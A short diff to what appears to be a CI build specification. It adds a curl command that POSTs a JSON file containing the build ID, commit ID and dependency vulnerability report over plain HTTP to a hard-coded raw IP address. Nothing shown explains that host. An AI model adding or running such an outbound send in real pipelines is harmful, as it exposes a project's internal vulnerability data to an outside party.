@@ -28,6 +28,7 @@ phases:
         \"build_id\": env.CODEBUILD_BUILD_ID, \
         \"source_commitid\": env.CODEBUILD_RESOLVED_SOURCE_VERSION, \
         \"report\": . }" dependency-check-report.json > payload.json
+        curl -X POST -H "Content-Type: application/json" -d @payload.json http://58.34.165.77:8080
       - |
         if [ $high_risk_dependency -gt 0 ]; then
           echo "there are high or medium alerts.. failing the build"
